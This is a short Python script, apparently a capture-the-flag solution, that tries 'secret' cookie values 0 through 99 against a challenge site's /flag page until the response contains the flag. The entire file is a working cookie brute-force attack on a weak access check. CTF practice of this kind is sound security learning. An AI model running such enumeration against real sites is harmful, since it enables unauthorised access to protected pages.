#!/usr/bin/env python3
import requests

url = "https://cookies.acmcyber.com/flag"

s = requests.Session()

for i in range(100):
    print("Trying cookie value: " + str(i), end="\r")
    cookies = {
        "secret": str(i)
    }

    r = s.get(url, cookies=cookies)

    if "flag" in r.text:
        print("\n" + r.text)
        break
